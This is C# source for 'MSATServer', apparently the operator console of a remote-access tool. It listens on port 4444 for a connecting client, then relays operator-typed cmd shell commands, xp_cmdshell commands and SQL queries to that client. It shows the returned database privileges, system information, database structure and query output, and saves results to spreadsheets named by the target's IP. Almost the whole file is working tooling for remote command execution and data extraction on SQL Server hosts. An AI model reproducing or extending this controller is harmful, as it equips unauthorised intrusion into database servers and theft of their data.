using DevExpress.Spreadsheet;
using Spire.Xls;
using System;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
//using Worksheet = DevExpress.Spreadsheet.Worksheet;

namespace MSATServer
{
    public partial class MSATServer : DevExpress.XtraEditors.XtraForm
    {

        //Boolean loadingflag = true;
        String sqlcommnd = "";
        String serverHOST = "localhost";
        int serverPORT = 4444;
        Listening listening = new Listening();
        Loading loading = new Loading();
        Socket tcpClient = null;

        public MSATServer()
        {
            
            listening.Show();
            listening.SetLoading(loading);

            

            new Thread(() =>
            {
                //Application.EnableVisualStyles();
                //Application.SetCompatibleTextRenderingDefault(false);
                //Application.Run(new Sign());
                //Application.Run(new Loading());
                //Loading loading = new Loading();
                //Application.Run(loading);
                //loading.Show();
                Boolean a = false;
                while (!a)
                {
                    a = listening.Getflag();
                    //loading.Setinfo("连接成功！");
                }
                Console.WriteLine("Listen...");
                serverHOST = listening.GetHost();
                serverPORT = listening.GetPort();
                Console.WriteLine(serverHOST+":"+serverPORT);
                IPEndPoint serverIP = new IPEndPoint(IPAddress.Parse(serverHOST), serverPORT);
                //Send send = new Send();
                Socket tcpServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                tcpServer.Bind(serverIP);
                tcpServer.Listen(1000);
                //Socket tcpClient = tcpServer.Accept();
                tcpClient = tcpServer.Accept();

                Console.WriteLine("连接成功！\r\n");
                //send.TcpServer(tcpClient);
                TcpServer();
                this.Invoke((MethodInvoker)delegate { 
                    sqlCommand.Text = "客户端连接成功！请连接数据库！";
                    loading.Close();
                });

            }).Start();
            //loading.Show();
            //Sign sign = new Sign();
            //sign.Show();
            InitializeComponent();
        }


        Sign login = Sign.GetSingleMode();

        private void MSATServer_Load(object sender, EventArgs e) {
            ribbonControl1.Minimized = true;
            /**Console.WriteLine("Listen...");
            IPEndPoint serverIP = new IPEndPoint(IPAddress.Parse("192.168.247.1"), 4444);
            Send send = new Send();
            Socket tcpServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            tcpServer.Bind(serverIP);
            tcpServer.Listen(1000);
            Socket tcpClient = tcpServer.Accept();
            
            Console.WriteLine("连接成功！\r\n");
            send.TcpServer(tcpClient);**/
            //send.TcpServer(serverIP);
            //this.FormClosing += new FormClosingEventHandler(MainForm_Closing);
        }

        private void xtraTabControl1_Click(object sender, EventArgs e)
        {

        }

        private void barButtonItem1_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {

        }

        private void MSATServer_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult result;
            Console.WriteLine("正在关闭程序!");
            result = MessageBox.Show("确定退出吗？", "退出", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
            if (result == DialogResult.OK)
            {
                System.Environment.Exit(0);
                //Application.ExitThread();
            }
            else
            {
                e.Cancel = true;
            }
        }

        private void spreadsheetControl1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void panelControl1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void sign_Click(object sender, EventArgs e)
        {
            login.settcpClient(tcpClient);
            login.Show();
            //Application.Run(new Sign());
        }

        private void simpleButton1_Click(object sender, EventArgs e)
        {

        }

        private void refresh_Click(object sender, EventArgs e)
        {
            Console.WriteLine(""+login.GetsqlIP()+login.GetsqlUserName()+login.GetsqlPWD()+login.GetsqlName());
        }

        private void cmdButton_Click(object sender, EventArgs e)
        {
            try
            {
                String mess;
                mess = cmdInPutTextBox.Text.ToString();   //chcp 65001  切换cmd到utf-8编码    936对应GB2312   950对应BIG5   1201对应unicode
                if (mess == null)
                {
                    mess = " ";
                }
                SendMess(tcpClient,mess,"4");
                //mess = StringToUnicode(mess);
                //mess = "4" + Scale.ToCurr((mess.Length + 3) / (1024 * 1024 * 3)).Substring(1, 2) + mess;
                //tcpClient.Send(Encoding.UTF8.GetBytes(mess));
            }
            catch (Exception ex)
            {
                Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                System.Environment.Exit(0);
            }
        }

        #region Tcp连接方式
        /// <summary>
        /// Tcp连接方式
        /// </summary>
        /// <param name="serverIP"></param>
        public void TcpServer()
        {
            //接收数据
            new Thread(() =>
            {
                //int sqlResultLength = 0;
                StringReader stream = null;
                XmlTextReader reader = null;
                while (true)
                {
                    String getmess = "";
                    byte[] data = new byte[1024 * 1024 * 3];
                    try
                    {
                        DataSet ds = new DataSet();
                        int length = tcpClient.Receive(data);
                        getmess = Encoding.UTF8.GetString(data, 0, length);  //调试
                        int thisLenFlag = getmess.Length;
                        //Console.WriteLine(getmess);
                        String allFlag = getmess.Substring(0, 12);
                        String mess = "";
                        char firstFlag = allFlag[0];
                        //char secondFlag = allFlag[1];
                        //char thirdFlag = allFlag[2];
                        //String lengthFlag = allFlag.Substring(1);
                        int lenFlag = Convert.ToInt32(allFlag.Substring(1));
                        /**try
                        {
                            lenFlag = Scale.ToInt32(lengthFlag);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("读取数据包长度标识符出差：" + ex.Message);
                        }**/
                        //Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(1字符长度为：" + mess.Length + "；标志位：" + firstFlag + "): " + getmess);
                        //Console.WriteLine(getmess);
                        //if (firstFlag == '2' || firstFlag == '3' || firstFlag == '4')
                        if (firstFlag == '1' || firstFlag == '2' || firstFlag == '3')
                            //if (firstFlag == '1' || firstFlag == '3')
                            mess = getmess.Substring(12);
                        else if (firstFlag == '4')
                        {
                            getmess = getmess.Substring(18);
                            string pattern = @"\n[\d]{12}\$GabgM";
                            string replacement = "\n";
                            Regex rgx = new Regex(pattern);
                            string result = rgx.Replace(getmess, replacement);
                            mess += result;
                        }
                        else
                            mess = UnicodeToString(getmess.Replace(allFlag, ""));
                        if(mess.Length < 40)
                            Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess);
                        else
                            Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess.Substring(0, 35));
                        //Console.WriteLine(getmess+"99999");
                        //getmess = getmess.Substring(0,50);
                        //getmess = RSADecrypt(getmess);
                        /**if (lenFlag < thisLenFlag)
                        {
                            string pattern = @"[\d]{12}\$GabgM";
                            foreach (Match match in Regex.Matches(mess, pattern))
                                Console.WriteLine(match.Value);

                        }**/
                        while (lenFlag > thisLenFlag )
                        //while (flag)
                        {
                            length = tcpClient.Receive(data);
                            getmess = Encoding.UTF8.GetString(data, 0, length);
                            thisLenFlag += getmess.Length;
                            if (firstFlag == '1' || firstFlag == '2' || firstFlag == '3')
                                mess += getmess;
                            else if (firstFlag == '4')
                            {
                                string pattern = @"\n[\d]{12}\$GabgM";
                                string replacement = "\n";
                                Regex rgx = new Regex(pattern);
                                string result = rgx.Replace(getmess, replacement);
                                mess += result;
                            }
                            else
                                mess += UnicodeToString(getmess);
                            //thisLenFlag++;
                            if (mess.Length < 40)
                                Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess);
                            else
                                Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess.Substring(0, 35));
                        }
                        if (firstFlag == '1')
                        {
                            this.Invoke((MethodInvoker)delegate
                            {
                                textBox1.Text = "IP：" + login.GetsqlIP() + "\r\n" + "User：" + login.GetsqlUserName();
                                sqlCommand.Text = "数据库连接成功！正在获取数据库结构信息...";
                                xp_cmdshellOutPutTextBox.Text = "数据库已连接！";
                                
                            });
                            if (mess[0] == '2')   //返回的数据库权限信息
                            {
                                this.Invoke((MethodInvoker)delegate
                                {
                                    textBox2.Text = mess.Substring(1);
                                });
                            }
                            else if (mess[0] == '3')   //数据库返回的系统基本信息
                            {
                                this.Invoke((MethodInvoker)delegate
                                {
                                    textBox3.Text = mess.Substring(1);
                                });
                            }
                            else if (mess[0] == '4')   //获取的数据库表字段信息
                            {
                                mess = mess.Substring(1);
                                stream = new StringReader(mess);
                                reader = new XmlTextReader(stream); ;
                                ds.ReadXml(reader);
                                this.Invoke((MethodInvoker)delegate
                                {
                                    sqlTreeView.Nodes.Clear();
                                    sqlCommand.Text = "数据库结构信息获取成功！";
                                });
                                foreach (DataTable dataTable in ds.Tables)
                                {
                                    TreeNode fatherTN = new TreeNode(dataTable.Rows[0]["database_name"].ToString());
                                    fatherTN = SetTreeNode(fatherTN, dataTable);
                                    //Console.WriteLine("当前数据库为："+dataTable.Rows[0]["database_name"].ToString());
                                    this.Invoke((MethodInvoker)delegate
                                    {
                                        sqlTreeView.Nodes.Add(fatherTN);
                                    });
                                }
                                //TreeNode fatherTN = new TreeNode(ds.Tables[0].Rows[0]["database_name"].ToString());
                                //fatherTN = SetTreeNode(fatherTN,ds);//Console.WriteLine(row[0].ToString());
                                /**this.Invoke((MethodInvoker)delegate
                                {
                                    sqlTreeView.Nodes.Add(fatherTN);
                                });**/
                            }
                        }
                        else if (firstFlag == '2')
                        {
                            //String[] resuletable = Regex.Split(mess, "_;,_", RegexOptions.IgnoreCase);
                            try
                            {
                                //Console.WriteLine(mess);
                                using (StreamWriter sw = new StreamWriter(".tmp.csv",false,Encoding.UTF8))
                                {
                                    sw.WriteLine(mess);
                                }
                            }
                            catch (Exception e)
                            {
                                // 向用户显示出错消息
                                Console.WriteLine("The file could not be Writer:");
                                Console.WriteLine(e.Message);
                            }

                            Workbook workbook = new Workbook();
                            workbook.LoadFromFile(".tmp.csv", "_;&,", 1, 1);
                            workbook.SaveToFile(".tmp.xlsx", ExcelVersion.Version2013);
                            DevExpress.Spreadsheet.Worksheet spreadsheet = spreadsheetControl1.ActiveWorksheet.Workbook.Worksheets[0];
                            this.Invoke((MethodInvoker)delegate
                            {
                                //worksheet.Import(datatable, true, 0, 0);
                                //worksheet.Workbook.LoadDocument("tmp.xlsx", DocumentFormat.OpenXml);
                                //var da = worksheet.GetDataRange();//获得有数据的区域
                                //worksheet.Columns.AutoFit(0, da.ColumnCount);//从0列到有数据的列自动列宽

                                spreadsheet.Workbook.LoadDocument(".tmp.xlsx", DocumentFormat.OpenXml);
                                var da = spreadsheetControl1.ActiveWorksheet.GetUsedRange();//获得有数据的区域
                                spreadsheetControl1.ActiveWorksheet.Columns.AutoFit(0, da.ColumnCount);
                                spreadsheetControl1.ActiveWorksheet.FreezeRows(0,da);
                                //spreadsheet.Columns.AutoFit(0, da.ColumnCount);
                                spreadsheet.FreezeRows(0, da);
                                sqlCommand.Text = sqlcommnd;
                            });

                        }
                        else if (firstFlag == '3')
                        {
                            String xp_cmdshellresult = "";
                            stream = new StringReader(mess);
                            reader = new XmlTextReader(stream); ;
                            ds.ReadXml(reader);
                            foreach (DataRow mDr in ds.Tables[0].Rows)
                            {
                                foreach (DataColumn mDc in ds.Tables[0].Columns)
                                {
                                    xp_cmdshellresult = xp_cmdshellresult + mDr[mDc].ToString() + "\r\n";
                                }
                            }
                            Console.WriteLine(xp_cmdshellresult);
                            this.Invoke((MethodInvoker)delegate
                            {
                                xp_cmdshellOutPutTextBox.Text = xp_cmdshellOutPutTextBox.Text + "\r\n" + xp_cmdshellInPutTextBox.Text + "\r\n" + xp_cmdshellresult;
                            });
                        }
                        else if (firstFlag == '4')
                        {
                            int len = mess.Length;
                            if (len > 0)
                            {
                                if (mess[0] == '\n' && len >= 2)
                                {
                                    mess = mess.Substring(1, len - 1);
                                    if (mess.EndsWith("\n"))
                                    {
                                        mess = mess.Substring(0, mess.Length - 1);
                                        //mess = mess.Replace("\n\n", "");
                                        //mess = mess.Replace("\r","\r\n");
                                    }
                                }
                            }
                            mess = mess.Replace("\n", "\r\n");
                            this.Invoke((MethodInvoker)delegate
                            {
                                //mess += "\r\n";
                                this.cmdOutPutTextBox.Text += mess;
                                //this.cmdOutPutTextBox.Text += GB2312ToUTF8(mess);
                                //this.cmdOutPutTextBox.ScrollToCaret();
                                //loading.Close();
                            });
                            //cmdOutPutText += mess;
                        }
                        else if (firstFlag == 'a')
                        {
                            this.Invoke((MethodInvoker)delegate
                            {
                                sqlCommand.Text = mess;
                            });
                        }
                        else if (firstFlag == 'b')
                        {
                            this.Invoke((MethodInvoker)delegate
                            {
                                if (xp_cmdshellOutPutTextBox.Text == "数据库未连接，请连接后再试！" || xp_cmdshellOutPutTextBox.Text == "请连接数据库！")
                                    xp_cmdshellOutPutTextBox.Text = mess;
                                else
                                    xp_cmdshellOutPutTextBox.Text += mess;
                            });
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                        Console.WriteLine(ex);
                        //System.Environment.Exit(0);
                    }
                }
            }).Start();
        }
        #endregion
        /**public void SendMess(Socket tcpClient, String mess, String flag)
        {
            try
            {
                Console.WriteLine(mess);
                mess = StringToUnicode(mess);
                mess = flag + Scale.ToCurr((mess.Length + 3) / (1024 * 1024 * 3)).Substring(1, 2) + mess;
                //Console.WriteLine(mess);
                byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
                tcpClient.Send(sendmess);
            }
            catch (Exception ex)
            {
                Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                System.Environment.Exit(0);
            }
        }**/

        public static void SendMess(Socket tcpClient, String mess, String flag)
        {
            try
            {
                //Console.WriteLine(mess);
                if (flag != "1" && flag != "2" && flag != "3" && flag != "4")
                    mess = StringToUnicode(mess);
                else if (flag == "4")
                    mess = "$GabgM" + mess;
                //int datanum = ((mess.Length + 3) / (1024 * 1024 * 3)) + 1;
                //mess = flag + Scale.ToCurr(datanum).Substring(1, 2) + mess;
                byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                //mess = flag + Scale.ToCurr(((sendmess.Length + 3) / (1024 * 1024 * 3)) + 1).Substring(1, 2) + mess;
                mess = flag + getLength(mess.Length) + mess;
                Console.WriteLine("标识位为：" + flag + getLength(mess.Length) + "；实际大小：" + mess.Length);
                sendmess = Encoding.UTF8.GetBytes(mess);
                tcpClient.Send(sendmess);
            }
            catch (Exception ex)
            {
                Console.WriteLine("发送消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                //System.Environment.Exit(0);
            }
        }

        public static String getLength(int stringlength)
        {
            String strLength = "";
            stringlength += 11;
            strLength = Convert.ToString(stringlength);
            for (int i = strLength.Length; i < 11; i++)
            {
                strLength = "0" + strLength;
            }
            return strLength;
        }


        public TreeNode SetTreeNode(TreeNode fatherTN, DataTable dataTable)
        {
            String tableName = dataTable.Rows[0]["table_name"].ToString();
            TreeNode tableTN = new TreeNode(tableName);
            fatherTN.Nodes.Add(tableTN);
            TreeNode columnTN;
            foreach (DataRow row in dataTable.Rows)
            {
                if (tableName == row[1].ToString())   //判断表名是否已经在节点中了
                {
                    columnTN = new TreeNode(row[2].ToString());
                    tableTN.Nodes.Add(columnTN);
                }
                else
                {
                    tableName = row[1].ToString();
                    tableTN = new TreeNode(tableName);
                    fatherTN.Nodes.Add(tableTN);
                    columnTN = new TreeNode(row[2].ToString());
                    tableTN.Nodes.Add(columnTN);
                }

            }
            return fatherTN;
        }

        public static string StringToUnicode(string s)
        {
            if (s != null)
            {
                char[] charbuffers = s.ToCharArray();
                byte[] buffer;
                String uniString = "";
                //StringBuilder sb = new StringBuilder();
                for (int i = 0; i < charbuffers.Length; i++)
                {
                    buffer = System.Text.Encoding.Unicode.GetBytes(charbuffers[i].ToString());
                    int uninum = buffer[1] * 16 * 16 + buffer[0];
                    String uni = Scale.ToCurr(uninum);
                    uniString += uni;
                }
                return uniString;
            }
            return s;
        }

        public static string UnicodeToString(string srcText)
        {
            string dst = "";
            string src = srcText;
            int len = srcText.Length / 3;
            for (int i = 0; i <= len - 1; i++)
            {
                string str = "";
                str = src.Substring(0, 3);
                src = src.Substring(3);
                int uninum = Scale.ToInt32(str);
                String str1 = Convert.ToString(uninum % (16 * 16), 16);
                String str0 = Convert.ToString((uninum - (uninum % (16 * 16))) / (16 * 16), 16);
                byte[] bytes = new byte[2];
                bytes[1] = byte.Parse(int.Parse(str0, NumberStyles.HexNumber).ToString());
                bytes[0] = byte.Parse(int.Parse(str1, NumberStyles.HexNumber).ToString());
                dst += Encoding.Unicode.GetString(bytes);
            }
            return dst;
        }

        public string UTF8ToGB2312(string str)

        {
            try
            {
                Encoding utf8 = Encoding.GetEncoding(65001);
                Encoding gb2312 = Encoding.GetEncoding("gb2312");//Encoding.Default ,936
                byte[] temp = utf8.GetBytes(str);
                byte[] temp1 = Encoding.Convert(utf8, gb2312, temp);
                string result = gb2312.GetString(temp1);
                return result;
            }
            catch (Exception ex)//(UnsupportedEncodingException ex)
            {
                MessageBox.Show(ex.ToString());
                return null;
            }
        }
        public string GB2312ToUTF8(string str)
        {
            try
            {
                Encoding uft8 = Encoding.GetEncoding(65001);
                Encoding gb2312 = Encoding.GetEncoding("gb2312");
                byte[] temp = gb2312.GetBytes(str);
                //MessageBox.Show("gb2312的编码的字节个数：" + temp.Length);
                for (int i = 0; i < temp.Length; i++)
                {
                    //MessageBox.Show(Convert.ToUInt16(temp[i]).ToString());
                }
                byte[] temp1 = Encoding.Convert(gb2312, uft8, temp);
                //MessageBox.Show("uft8的编码的字节个数：" + temp1.Length);
                for (int i = 0; i < temp1.Length; i++)
                {
                   // MessageBox.Show(Convert.ToUInt16(temp1[i]).ToString());
                }
                string result = uft8.GetString(temp1);
                return result;
            }
            catch (Exception ex)//(UnsupportedEncodingException ex)
            {
                MessageBox.Show(ex.ToString());
                return null;
            }
        }

        public static class Scale
        {
            /// <summary>
            /// 进制符号字符串
            /// </summary>
            private static string scString = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            /// <summary>
            /// 字符集，可以根据编号索引拿到字符
            /// </summary>
            private static char[] scArray = scString.ToCharArray();
            /// <summary>
            /// 字符字典，可以根据字符拿到编号索引
            /// </summary>
            private static Dictionary<char, int> scDic = ToCharDic();
            /// <summary>
            /// 根据字符串反馈进制数
            /// </summary>
            public static int Len { get { return scString.Length; } }

            /// <summary>
            /// 将字符串处理成字符字典
            /// </summary>
            private static Dictionary<char, int> ToCharDic()
            {
                Dictionary<char, int> dic = new Dictionary<char, int>();
                for (int i = 0; i < scArray.Length; i++)
                {
                    dic.Add(scArray[i], i);
                }
                return dic;
            }
            /// <summary>
            /// 根据传入的字符符号定义进制，字符符号不能重复，模拟十进制字符串为：0123456789
            /// </summary>
            public static void SetScale(string scaleString)
            {
                scString = scaleString;
                scArray = scString.ToCharArray();
                scDic = ToCharDic();
            }
            /// <summary>
            /// 将Int64转成当前进制字符串
            /// </summary>
            public static string ToCurr(long num)
            {
                string curr = "";
                while (num >= Len)
                {
                    curr = scArray[num % Len] + curr;
                    num = num / Len;
                }
                curr = scArray[num] + curr;
                if (curr.Length == 0)
                {
                    curr = "000";
                }
                else if (curr.Length == 1)
                {
                    curr = "00" + curr;
                }
                else if (curr.Length == 2)
                {
                    curr = "0" + curr;
                }
                return curr;
            }
            /// <summary>
            /// 将当前进制字符串转成Int64
            /// </summary>
            public static int ToInt32(string curr)
            {
                double num = 0;
                for (int i = 0; i < curr.Length; i++)
                {
                    num += scDic[curr[i]] * Math.Pow(Len, curr.Length - 1 - i);
                }
                return Convert.ToInt32(num);
            }
        }

        private void cmdOutPutTextBox_TextChanged(object sender, EventArgs e)
        {
            cmdOutPutTextBox.SelectionStart = cmdOutPutTextBox.Text.Length; //设置文本起点位置
            cmdOutPutTextBox.ScrollToCaret(); //滚动到当前插入位置
        }

        private void xp_cmdshellButton_Click(object sender, EventArgs e)
        {
            String xp_cmdshellInPut = xp_cmdshellInPutTextBox.Text.ToString();
            SendMess(tcpClient,xp_cmdshellInPut,"3");
        }

        private void sqlSearch_Click(object sender, EventArgs e)
        {
            sqlcommnd = sqlCommand.Text.ToString();
            SendMess(tcpClient, sqlcommnd, "2");
            this.Invoke((MethodInvoker)delegate {
                sqlCommand.Text = sqlcommnd + "\r\n 正在查询中，请勿重复点击查询！";
            });
        }

        private void xp_cmdshellOutPutTextBox_TextChanged(object sender, EventArgs e)
        {
            xp_cmdshellOutPutTextBox.SelectionStart = xp_cmdshellOutPutTextBox.Text.Length; //设置文本起点位置
            xp_cmdshellOutPutTextBox.ScrollToCaret(); //滚动到当前插入位置
        }

        private void saveButton_Click(object sender, EventArgs e)
        {
            try
            {
                String command = sqlCommand.Text;
                string pattern = @"\b[fF]\S*\b *\S*";
                MatchCollection mc = Regex.Matches(command, pattern);
                foreach (Match m in mc)
                {
                    pattern = @"\b[fF]\S*\b *";
                    Regex rgx = new Regex(pattern);
                    command = rgx.Replace(m.Value, "");
                    break;
                }
                command = login.GetsqlIP() + "-" + command + ".xlsx";
                //spreadsheetControl1.Document.SaveDocument(command, DocumentFormat.OpenXml);
                Workbook workbook = new Workbook();
                workbook.LoadFromFile(".tmp.xlsx");
                workbook.SaveToFile(command, ExcelVersion.Version2013);
                //spreadsheetControl1.ActiveWorksheet.Workbook.Worksheets[0].Workbook.SaveDocument(command, DocumentFormat.OpenXml);
                MessageBox.Show("导出路径：" + System.Windows.Forms.Application.StartupPath + "\\" + command, "导出成功");
            }
            catch (Exception ex)
            {
                MessageBox.Show("失败原因：" + ex.Message , "导出失败");
            }

        }
    }
}
